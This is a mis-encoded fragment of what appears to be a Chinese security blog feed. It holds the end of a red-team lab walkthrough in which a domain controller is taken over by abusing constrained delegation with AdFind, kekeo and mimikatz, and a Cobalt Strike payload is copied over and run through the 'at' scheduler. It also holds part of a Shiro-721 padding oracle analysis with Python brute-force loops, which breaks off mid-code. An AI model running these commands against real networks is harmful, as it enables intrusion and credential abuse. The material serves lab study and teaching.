href="#æ‹¿ä¸‹åŸŸæ§" class="headerlink" title="æ‹¿ä¸‹åŸŸæ§"></a>æ‹¿ä¸‹åŸŸæ§</h2><p>æˆ‘ä»¬ç°åœ¨æ‹¿ä¸‹äº†åŸŸå†…çš„ä¸€å°ä¸ªäººä¸»æœºï¼Œä¸€å°sqlæœåŠ¡å™¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æœ€åä¸€å°åŸŸæ§äº†<br>ç°åœ¨çš„æ‹¿ä¸‹çš„ä¸»æœºï¼Œæœ‰ä¸€å°é¢œè‰²ä¸å¤ªç»Ÿä¸€ï¼Œæˆ‘ä»¬å…ˆç»™ä»–æä¸ªæƒ<br><img src="https://s2.loli.net/2023/01/17/m69DgTJWbeLfNiK.png"><br>å¥½äº†ï¼Œèˆ’æœäº†ï¼Œç°åœ¨å…¨åŠ›æ‹¿ä¸‹åŸŸæ§<br>ä½†è¿™é‡Œæåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><blockquote><p>#å§”æ´¾æ”»å‡»åˆ†ç±»ï¼šï¼ˆå§”æ´¾ç»§æ‰¿ï¼Œè½¬é€’ï¼‰åŸŸå§”æ´¾æ˜¯æŒ‡å°†åŸŸå†…ç”¨æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦æˆ·<br>1ã€éçº¦æŸæ€§å§”æ´¾ (æ²¡æœ‰é™åˆ¶æ€§çš„)<br>2ã€çº¦æŸæ€§å§”æ´¾ï¼ˆæœ‰é™åˆ¶æ€§çš„ï¼‰<br>3ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ï¼ˆå•æ–¹é¢ï¼Œèµ„æºä¸Šé¢çš„çº¦æŸï¼‰<br>è¿™ä¸ªéœ€è¦æŸ¥çœ‹æ˜¯åœ¨é‚£ä¸ªæœºå™¨ä¸Šé¢è®¾ç½®äº†è¿™ä¸ª<br>çº¦æŸæ€§å§”æ´¾<br>userè®¿é—®service1ï¼Œå‘DCå‘èµ·kerberosè®¤è¯ï¼ŒåŸŸæ§è¿”å›userçš„TGTå’ŒST1ç¥¨æ®ï¼Œuserä½¿ç”¨ST1ç¥¨æ®å¯¹service1è¿›è¡Œè®¿é—®ï¼›å¦‚æœé…ç½®äº†service1åˆ°service2çš„çº¦æŸå§”æ´¾ï¼Œåˆ™service1èƒ½ä½¿ç”¨S4U2Proxyåè®®å°†ç”¨æˆ·å‘ç»™è‡ªå·±çš„å¯è½¬å‘çš„ST1ç¥¨æ®ä»¥ç”¨æˆ·çš„èº«ä»½å‘ç»™DCï¼›DCè¿”å›service1ä¸€ä¸ªç”¨æ¥è®¿é—®service2çš„ST2ç¥¨æ®,è¿™æ ·service1å°±èƒ½ä»¥ç”¨æˆ·çš„èº«ä»½å¯¹service2å‘èµ·è®¿é—®ã€‚<br>1ã€æœºå™¨è®¾ç½®ä»…ä¿¡ä»»æ­¤è®¡ç®—æœºæŒ‡å®šæœåŠ¡-cifs<br>2ã€ç”¨æˆ·è®¾ç½®ä»…ä¿¡ä»»æ­¤è®¡ç®—æœºæŒ‡å®šæœåŠ¡-cifs</p></blockquote><p>è¿™é‡Œæˆ‘ä»¬å…ˆç”¨<code>AdFind</code>æ¥æŸ¥æ‰¾å­˜åœ¨çš„æœºå™¨</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">æŸ¥æ‰¾åŸŸå†…çº¦æŸå§”æ´¾ç”¨æˆ·å’Œè®¡ç®—æœºï¼š<br>AdFind.<span class="hljs-keyword">exe</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">10.8</span> -<span class="hljs-keyword">u</span> sqlserver -<span class="hljs-keyword">up</span> Server12345 -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=redteam,DC=red&quot;</span> -<span class="hljs-keyword">f</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-keyword">cn</span> distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/TwuEPAGfpY7QDLb.png"><br>æ¥ç€å»è¯·æ±‚è·å–ç¥¨æ®</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">-</span>æ”»å‡»åŸŸå†…åŸŸæ§ä¸»æœº <span class="hljs-selector-tag">-</span> çº¦æŸå§”æ´¾<br>1ã€<span class="hljs-selector-tag">kekeo</span>è¯·æ±‚è·å–<span class="hljs-selector-tag">sqlserver</span>çš„<span class="hljs-selector-tag">TGT</span>ï¼š<span class="hljs-selector-tag">kekeo</span> &quot;<span class="hljs-selector-tag">tgt</span><span class="hljs-selector-pseudo">::ask</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:sqlserver</span> /<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:redteam.red</span> /<span class="hljs-selector-tag">password</span><span class="hljs-selector-pseudo">:Server12345</span> /<span class="hljs-selector-tag">ticket</span><span class="hljs-selector-pseudo">:administrator.kirbi&quot;</span> &quot;<span class="hljs-selector-tag">exit</span>&quot;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/Qy2oqVZSubz5NA1.png"><br>æ¥ç€å°±æ˜¯ä½¿ç”¨ç¥¨æ®</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">2</span>ã€ä½¿ç”¨ç¥¨æ®è¯·æ±‚åŸŸæ§ï¼škekeo <span class="hljs-string">&quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><span class="hljs-number">3</span>ã€å¯¼å…¥å†…å­˜ï¼ˆå¯¼å…¥å¤±è´¥çš„è¯ï¼Œä½¿ç”¨æ™®é€šç”¨æˆ·å¯¼å…¥ï¼‰ï¼šmimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi<br><span class="hljs-number">4</span>ã€è¿æ¥åŸŸæ§ï¼šdir <span class="hljs-string">\\owa.redteam.red\c$</span><br><span class="hljs-number">5</span>ã€copy <span class="hljs-number">57.exe</span> <span class="hljs-string">\\owa.redteam.red\c$</span>  <span class="hljs-comment">#æ‹·è´æ‰§è¡Œæ–‡ä»¶åˆ°ç›®æ ‡æœºå™¨</span><br><span class="hljs-number">6</span>ã€at <span class="hljs-string">\\owa.redteam.red</span> <span class="hljs-number">22</span>:<span class="hljs-number">07</span> c:<span class="hljs-string">\57.exe</span>   <span class="hljs-comment">#æ·»åŠ è®¡åˆ’ä»»åŠ¡  15:47æ˜¯æ‰§è¡Œçš„æ—¶é—´</span><br>atå‘½ä»¤é€‚ç”¨äºå°äºwin2012çš„æœºå™¨<br></code></pre></td></tr></table></figure><p>ç„¶åè¿˜æ˜¯ä¸€æ ·ï¼Œç”¨csç”Ÿæˆçš„ç ï¼Œé€šè¿‡sqlæœåŠ¡å™¨ï¼Œcopyåˆ°åŸŸæ§ä¸Š<br><img src="https://s2.loli.net/2023/01/17/jHBUzYv1rSwAF2V.png"><br>ä½†è¿™é‡Œæœ€å¼€å§‹ä¸€ç›´ä¼ ä¸ä¸Šå»ï¼ŒåŸå› æ˜¯ç¥¨æ®æ˜¯ä¸€ç›´æ›´æ–°çš„ï¼Œä¼šè¿‡æœŸ<br>æ‰€ä»¥é‡æ–°å¯¼å…¥ä¸€ä¸ªç¥¨æ®ä¹‹åï¼Œå†è¿›è¡Œcopy<br><img src="https://s2.loli.net/2023/01/17/2V3LQd5mcOnrZkT.png"><br>æˆåŠŸä¼ ä¸Šå»äº†<br>æ¥ç€å°±æ˜¯ç»™åŸŸæ§è®¾ç½®ä¸€ä¸ªä»»åŠ¡ï¼Œä½¿ç åˆ°æ—¶é—´ä¹‹åï¼Œè‡ªåŠ¨æ‰§è¡Œ<br>åŒæ ·ï¼Œè¿™é‡Œä¹Ÿä¼šæœ‰ç¥¨æ®è¿‡æœŸçš„é—®é¢˜ï¼Œå†é‡æ–°åŠ è½½ä¸€ä¸ªå°±å¥½äº†<br><img src="https://s2.loli.net/2023/01/17/lcIBH5Cgy4kjn7E.png"><br>æœ€åï¼Œæ‹¿ä¸‹åŸŸæ§<br><img src="https://s2.loli.net/2023/01/17/9dUBuvYMoa3X5Tn.png"><br>æ•´ä¸ªåŸŸæ§ï¼ŒsqlæœåŠ¡å™¨ï¼Œå†…ç½‘ä¸ªäººä¸»æœºï¼ŒWEBæœåŠ¡å™¨å…¨éƒ¨æ‹¿ä¸‹ï¼</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro-721æ¼æ´åˆ†æä¸å¤ç°</title>
      <link href="2023/01/05/Shiro-721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>2023/01/05/Shiro-721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬åˆ†æäº†<a href="https://glacierrrr.online/2023/01/04/Shiro-550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">shiro 550</a>çš„ååºåˆ—åŒ–æ¼æ´çš„åŸç†ä»¥åŠåº”ç”¨ï¼Œè¿™æ¬¡åˆ†æå¦ä¸€ä¸ªshiroçš„é«˜å±æ¼æ´shiro 721</p><a id="more"></a><p>shiro 721ä¸550åŒºåˆ«è¾ƒå¤§çš„æ˜¯ï¼Œ550å› ä¸ºå¯†é’¥ä¸ºå›ºå®šå¸¸é‡ï¼Œå¯¼è‡´å¯ä»¥ä¼ªé€ å„ç§ä¿¡æ¯ï¼Œè€Œ721ä¿®å¤äº†è¿™ä¸€ç‚¹ï¼Œå´åˆå‡ºç°äº†æ–°çš„é—®é¢˜</p><p>åœ¨shiro 721ä¸­ï¼ŒRememberMe Cookie é»˜è®¤é€šè¿‡AES-128-CBCåŠ å¯†ï¼Œè€Œè¿™ç§åŠ å¯†æ¨¡å¼å®¹æ˜“å—åˆ°é•¿åº¦æ‰©å±•æ”»å‡»(åœ¨è¿™é‡Œå…·ä½“ä¸ºPadding Oracle Attack( Oracle å¡«å……æ”»å‡» ))ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æœ‰æ•ˆçš„ RememberMe Cookie ä½œä¸ºPaddding Oracle Attack çš„å‰ç¼€ï¼Œç„¶åç²¾å¿ƒæ„é€ RememberMe Cookie æ¥å®æ–½ååºåˆ—åŒ–æ”»å‡»</p><ol><li>ä½¿ç”¨ä»»æ„è´¦æˆ·ç™»é™†ç›®æ ‡ç½‘ç«™ï¼Œä»¥è·å–ä¸€ä¸ªåˆæ³•çš„RememberMe Cookie</li><li>å°†è·å–çš„å€¼ä½œä¸ºPOAçš„å‰ç¼€</li><li>åŠ å¯†ååºåˆ—åŒ–çš„payloadæ¥æ„é€ æ¶æ„RememberMe Cookie</li><li>å°†æ„é€ å¥½çš„æ¶æ„æ•°æ®å¡«å……åˆ° RememberMe Cookieå­—æ®µä¸­å¹¶å‘é€</li></ol><blockquote><p>å½±å“ç‰ˆæœ¬ 1.2.5 &lt;= Shiro &lt;= 1.4.1</p></blockquote><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆå¾—æ˜ç¡®ä¸€ç‚¹ï¼Œè¿™ä¸ªæ¼æ´èƒ½å¤Ÿè¢«åˆ©ç”¨çš„æ ¸å¿ƒï¼Œå°±æ˜¯åˆ©ç”¨Padding Oracle Attackï¼Œé‚£å°±å…ˆæ¥åˆ†æä¸‹å¡«å……æ”»å‡»</p><h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><p>AES-128-CBCåŠ å¯†ï¼Œå¾ˆå¥½ç†è§£ï¼Œä½¿ç”¨çš„æ˜¯AESåŠ å¯†ç®—æ³•ï¼Œ128bitä¸ºä¸€ä¸ªåˆ†ç»„ï¼Œè€ŒCBCæŒ‡çš„æ˜¯åˆ©ç”¨CBCåŠ å¯†æ¨¡å¼</p><h3 id="AES-128-CBC"><a href="#AES-128-CBC" class="headerlink" title="AES-128-CBC"></a>AES-128-CBC</h3><blockquote><p>CBC åŠ å¯†æ¨¡å¼ï¼šå°†æ˜æ–‡åˆ‡åˆ†æˆè‹¥å¹²å°æ®µï¼Œç„¶åæ¯ä¸€æ®µåˆ†åˆ«ä¸ä¸Šä¸€æ®µçš„å¯†æ–‡è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå†ä¸å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆæœ¬æ®µæ˜æ–‡çš„å¯†æ–‡ï¼Œè¿™æ®µå¯†æ–‡ç”¨äºä¸‹ä¸€æ®µæ˜æ–‡çš„åŠ å¯†ã€‚ç¬¬ä¸€æ®µæ˜æ–‡æ²¡æœ‰å¯¹åº”çš„å¯†æ–‡ï¼Œä¸ºäº†ç¡®ä¿åˆ†ç»„çš„å”¯ä¸€æ€§ï¼ŒCBCåŠ å¯†æ¨¡å¼ä½¿ç”¨äº†åˆå§‹åŒ–å‘é‡ï¼ˆIVï¼ŒInitialization Vectorï¼‰ã€‚åˆå§‹åŒ–å‘é‡æ˜¯ä¸€ä¸ªå›ºå®šé•¿åº¦çš„éšæœºæ•°ï¼Œè¯¥å‘é‡ä¼šä½œä¸ºå¯†æ–‡ç¬¬ä¸€ä¸ªå—ï¼Œéšå¯†æ–‡ä¸€åŒä¼ è¾“ï¼Œåœ¨CBCæ¨¡å¼ä¸­ï¼Œå› ä¸ºé“¾æ¥æ¨¡å¼ä¸­çš„å¼‚æˆ–æ“ä½œæ˜¯ç­‰é•¿æ“ä½œï¼Œæ‰€ä»¥åˆå§‹åŒ–å‘é‡ï¼ˆIVï¼‰çš„é•¿åº¦ä¸åˆ†ç»„å¤§å°ç›¸åŒï¼Œä¸º16 Bytesï¼ˆ128 bitsï¼‰<br>çº¯ç²¹çš„æ–‡å­—è¿˜æ˜¯æ¯”è¾ƒæŠ½è±¡ï¼Œè¿™é‡Œæ”¾ä¸Šä¸€å¼ CBCåŠ å¯†çš„æµç¨‹å›¾ï¼Œå°±å¾ˆå¥½ç†è§£äº†<br><img src="https://s2.loli.net/2023/01/05/CfTSswDpdx8z7OF.png" alt="CBCåŠ å¯†"><br>é¦–å…ˆæŠŠæ˜æ–‡æŒ‰ç…§128bitä¸ºä¸€ç»„åˆ†ç»„ï¼Œå†ç”±åˆå§‹åŒ–çš„å‘é‡IVä¸æ˜æ–‡çš„ç¬¬ä¸€ç»„è¿›è¡Œå¼‚æˆ–ï¼ŒåŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡çš„ç¬¬ä¸€ç»„ã€‚å†ç”¨åˆšå¾—åˆ°çš„å¼‚åœ°ç»„å¯†æ–‡ä¸ç¬¬äºŒç»„æ˜æ–‡å¼‚æˆ–ï¼ŒåŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡çš„ç¬¬äºŒç»„ä¾æ¬¡å¾€å</p></blockquote><p>è¿™æ ·å°±å¾ˆå¥½ç†è§£äº†ï¼Œä½†æˆ‘ä»¬ä¹Ÿä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ç»™æ˜æ–‡åˆ†ç»„çš„æ—¶å€™ï¼Œå¦‚æœä¸æ˜¯128bitçš„å€æ•°ï¼Œä¹Ÿå°±æ˜¯æœ€åä¸€ç»„ä¸å¤Ÿ128bit(16byte)çš„æ—¶å€™æ€ä¹ˆåŠï¼Œä¾‹å¦‚ï¼š<br>0123456789ABCDEF FEDCBA9876543210<br>è¿™ä¸€å…±æ˜¯32byteï¼Œä¹Ÿå°±æ˜¯256bitåˆšå¥½å¯ä»¥åˆ†ä¸ºä¸¤ç»„<br>0123456789ABCDEF FEDCBA987654<br>è¿™ä¸€å…±æ˜¯28byte, ä¹Ÿå°±æ˜¯224bitï¼Œç¬¬äºŒç»„ä¸æ»¡128bit<br>å¦‚æœå°±è¿™æ ·è¿›å…¥CBCä¸­åŠ å¯†ï¼Œé‚£ä¹ˆåœ¨å¼‚æˆ–è¿™ä¸€æ­¥çš„æ—¶å€™ï¼Œå°±ä¼šå› ä¸ºä½æ•°ä¸åŒè€Œæ— æ³•è¿›è¡Œä¸‹å»ï¼Œæ•…å½“åˆçš„ç®—æ³•è®¾è®¡è¿™å°±æƒ³åˆ°äº†ï¼Œä½¿ç”¨PKCS5è¿›è¡Œé•¿åº¦å¡«å……ï¼Œæ¯”å¦‚åœ¨ç¬¬äºŒä¸ªä¾‹å­ä¸­ï¼Œæœ€åç¼ºå°‘4ä¸ªbyteï¼Œåˆ™å¡«å……4ä¸ª0x04ï¼Œè‹¥ç¼ºå°‘15ä¸ªbyteï¼Œåˆ™å¡«å……15ä¸ª0x0f</p><h3 id="å¡«å……Oracleæ”»å‡»"><a href="#å¡«å……Oracleæ”»å‡»" class="headerlink" title="å¡«å……Oracleæ”»å‡»"></a>å¡«å……Oracleæ”»å‡»</h3><blockquote><p>Padding Oracleå¡«å……æ”»å‡»ï¼ˆPadding Oracle Attackï¼‰æ˜¯æ¯”è¾ƒæ—©çš„ä¸€ç§æ¼æ´åˆ©ç”¨æ–¹å¼äº†ï¼Œæ—©åœ¨2011å¹´çš„Pwnie Rewardsä¸­è¢«è¯„ä¸ºâ€œæœ€å…·æœ‰ä»·å€¼çš„æœåŠ¡å™¨æ¼æ´â€ã€‚è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯ç”±äºè®¾è®¡ä½¿ç”¨çš„åœºæ™¯ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨å¯†ç ç®—æ³•é€šè¿‡â€œæ—è·¯æ”»å‡»â€è¢«ç ´è§£ã€‚å€¼å¾—å¼ºè°ƒçš„æ˜¯ï¼Œè¿™ä¸ªæ¼æ´å¯ç¤ºå¹¶ä¸æ˜¯å¯¹ç®—æ³•æœ¬èº«çš„ç ´è§£ï¼Œè€Œæ˜¯åˆ©ç”¨ç®—æ³•æœ¬èº«çš„æŸäº›paddingç‰¹æ€§ä»¥åŠç³»ç»Ÿä¸­ä¸å¿…è¦çš„ä¸€äº›é”™è¯¯æç¤ºï¼Œè¿›è€Œåˆ†æå‡ºç³»ç»Ÿå½“å‰çš„æ¼æ´åˆ©ç”¨è·¯å¾„ã€‚åŒæ—¶ä¹Ÿéœ€è¦å¼ºè°ƒä¸‹ï¼Œè¿™é‡Œçš„Oracleï¼Œå…¶å®ä¸ç”²éª¨æ–‡å…¬å¸å…³ç³»å¹¶ä¸å¤§ï¼Œè¿™é‡Œçš„Oracleå¯ä»¥ç†è§£ä¸ºâ€œæç¤ºã€æš—ç¤ºâ€çš„å«ä¹‰ã€‚<br>æ—¢ç„¶æ˜¯æœåŠ¡å™¨æ¼æ´ï¼Œé‚£ä¹ˆè‚¯å®šä¼šæ¶‰åŠåˆ°ä¸æœåŠ¡å™¨è¿›è¡Œçš„äº¤äº’ï¼Œè€Œè¿™é‡Œå°±æ˜¯ç”¨åˆ°æœåŠ¡å™¨ç»™å‡ºçš„å›æ˜¾æˆ–è€…ç›¸åº”çš„ä¸åŒï¼Œæ¥åˆ¤æ–­å¡«å……çš„æ˜¯å¦æ­£ç¡®ï¼Œä¾‹å¦‚ï¼š<br>æœåŠ¡å™¨è¿”å›200 -&gt; å¯†æ–‡ä¸å¡«å……å‡æ­£ç¡®<br>æœåŠ¡å™¨è¿”å›301 -&gt; å¯†æ–‡æ­£ç¡®ï¼Œå¡«å……é”™è¯¯<br>æœåŠ¡å™¨è¿”å›500 -&gt; å¯†æ–‡ä¸å¡«å……å‡é”™è¯¯<br>è¿™é‡Œæ ¹æ®æœåŠ¡å™¨çš„ç›¸åº”å˜åŒ–ï¼Œç©·ä¸¾å¡«å……çš„å€¼ï¼Œå…¶å®å¾ˆç±»ä¼¼äº<strong>SQLä¸­çš„ç›²æ³¨</strong><br>æˆ‘ä»¬å†æ¥å…·ä½“çœ‹CBCçš„è§£å¯†æµç¨‹<br><img src="https://s2.loli.net/2023/01/05/uwtMmj2U9BJhczi.png" alt="CBCè§£å¯†"><br>è§£å¯†æ—¶ï¼Œä¸åŠ å¯†ä¸€æ ·ï¼Œå…ˆå°†å¯†æ–‡æŒ‰128bitåˆ†ç»„ï¼Œç„¶åå°†ç¬¬ä¸€ç»„å¯†æ–‡ä¸å¯†é’¥è¿›è¡Œè§£å¯†ï¼Œå†ä¸åˆå§‹å‘é‡IVå¼‚æˆ–ï¼Œå¾—åˆ°ç¬¬ä¸€ç»„æ˜æ–‡ï¼Œç¬¬äºŒç»„å¯†æ–‡ä¸å¯†é’¥è¿›è¡Œè§£å¯†ï¼Œå†ä¸ç¬¬ä¸€ç»„å¯†æ–‡å¼‚æˆ–ï¼Œå¾—åˆ°ç¬¬äºŒç»„å¯†æ–‡ï¼Œä»¥æ­¤è¿›è¡Œè§£å¯†<br>å› ä¸ºOracleçš„ä»»åŠ¡æ˜¯æäº¤æ•°æ®è®©æœåŠ¡å™¨è§£å¯†ï¼Œå¹¶éªŒè¯è§£å¯†åæ˜æ–‡åˆ†ç»„æ˜¯å¦æ­£ç¡®ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦å»è§£å¯†æ˜æ–‡ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦å»éå†è¾“å…¥çš„å€¼ï¼Œæ ¹æ®æœåŠ¡å™¨çš„è¿”å›ä¿¡æ¯ï¼Œæ¥åˆ¤æ–­æ­£ç¡®ï¼ŒçŸ¥é“æˆ‘ä»¬æ‰¾åˆ°æ­£ç¡®çš„å€¼ï¼Œä¹Ÿå°±è¿™ä¸ªpaddingç¬¦åˆè§„èŒƒ</p></blockquote><p><img src="https://s2.loli.net/2023/01/05/jR6mXN7VaepQ5HS.png" alt="CBCè§£å¯†"></p><ol><li>å¯¹äºrçš„ç ´è§£<br>æ ¹æ®CBCè§£å¯†çš„æµç¨‹ï¼Œä»æœ€åä¸€ä¸ªåˆ†ç»„å…¥æ‰‹ï¼Œç©·ä¸¾çŒœæµ‹rä½¿å…¶æ»¡è¶³CBCæœ€åä¸€ä¸ªæˆ–è€…å¤šä¸ªåˆ†ç»„çš„è¾“å‡ºå¡«å……è§„åˆ™ï¼Œä¾‹å¦‚æœ€åä¸€ä¸ªå­—èŠ‚æ»¡è¶³<img src="https://s2.loli.net/2023/01/05/ZS4HIyfvM21Vhdk.png" alt="æ³¨æ„ï¼Œyçš„çœŸå®å¡«å……å¯èƒ½å¹¶éä¸º0x01"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br><br>        c2=c2[:<span class="hljs-number">30</span>]+i+_<br>        <span class="hljs-comment"># c1=c1[:30]+i+_</span><br>        <span class="hljs-comment"># iv=iv[:30]+i+_</span><br><br>        iv_c=iv+c1+c2+c3<br>        <span class="hljs-comment"># iv_c=iv+c1+c2</span><br>        <span class="hljs-comment"># iv_c=iv+c1</span><br><br>        output = subp.call([<span class="hljs-string">&#x27;./dec_oracle.exe&#x27;</span>,iv_c])<br>        <span class="hljs-keyword">if</span> output==<span class="hljs-number">200</span>:<br>            print(i+_,<span class="hljs-string">&#x27;`````````````````````````&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li>è¿›ä¸€æ­¥åˆ¤æ–­å¡«å……çš„é•¿åº¦<br>æ¥ä¸‹æ¥å°±æ˜¯è¿›ä¸€æ­¥åˆ¤æ–­å¡«å……çš„é•¿åº¦ï¼Œä»r1å…¥æ‰‹ï¼Œé€ä¸ªå­—ä¿®æ”¹ä¸ç¡®è®¤<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>,<span class="hljs-number">2</span>):<br>     r=r1[:i]+<span class="hljs-string">&#x27;00&#x27;</span>+r1[i+<span class="hljs-number">2</span>:]<br><br>     iv_c_new=iv+c1+r+c3<br>     <span class="hljs-comment"># iv_c_new=iv+r+c2</span><br>     <span class="hljs-comment">#iv_c_new=r+c1</span><br>     output = subp.call([<span class="hljs-string">&#x27;./dec_oracle.exe&#x27;</span>,iv_c_new])<br>     <span class="hljs-keyword">if</span> output==<span class="hljs-number">500</span>:<br>         <span class="hljs-built_in">len</span>=<span class="hljs-number">16</span>-i/<span class="hljs-number">2</span>  <br>         print(<span class="hljs-built_in">len</span>) <span class="hljs-comment">#å¡«å……é•¿åº¦len=1,ç¬¬äºŒç»„å¡«å……é•¿åº¦len=1,ç¬¬ä¸‰ç»„å¡«å……é•¿åº¦len=1</span><br><br>print(<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x01</span>^<span class="hljs-number">0x3d</span>))<br></code></pre></td></tr></table></figure></li><li>è¿›ä¸€æ­¥å¾—åˆ°aj-1<br>é€šè¿‡è°ƒæ•´rï¼Œå°†CBCè§£å¯†åçš„å¡«å……ä¿®æ”¹ä¸ºé•¿åº¦ä¸ºb-j+2çš„å½¢å¼ï¼Œå³è®©aj-1å¯¹åº”çš„å­—èŠ‚ä¹Ÿæˆä¸ºå¡«å……<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>            r1=r1[:<span class="hljs-number">30</span>-n*<span class="hljs-number">2</span>]+i+_+r1[<span class="hljs-number">32</span>-n*<span class="hljs-number">2</span>:]<br>            <br>             iv_c_new=iv+c1+r1+c3<br>            <span class="hljs-comment"># iv_c_new=iv+r1+c2</span><br>            <span class="hljs-comment"># iv_c_new=r1+c1</span><br>            <br>            output = subp.call([<span class="hljs-string">&#x27;./dec_oracle.exe&#x27;</span>,iv_c_new])<br>            <span class="hljs-keyword">if</span> output==<span class="hljs-number">200</span>:<br>                print(i+_,<span class="hljs-string">&#x27;``````````````````````````````````succeed!````````````````````````````````````&#x27;</span>)<br>                num=(<span class="hljs-built_in">int</span>(i+_,<span class="hljs-number">16</span>)^(n+<span class="hljs-number">1</span>))<br>                num=<span class="hljs-built_in">hex</span>(num)<br>                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(num)&lt;<span class="hljs-number">4</span>):<br>                    num=<span class="hljs-string">&#x27;0x0&#x27;</span>+num[<span class="hljs-number">2</span>:]<br>                a.insert(<span class="hljs-number">0</span>,num[<span class="hljs-number">2</span>:])<br>                <span class="hljs-keyword">break</span><br>    r1=r1[:<span class="hljs-number">32</span>-(n+<span class="hljs-number">1</span>)*<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(a[q],<span class="hljs-number">16</span>)^(n+<span class="hljs-number">2</span>)))&lt;<span class="hljs-number">4</span>):<br>            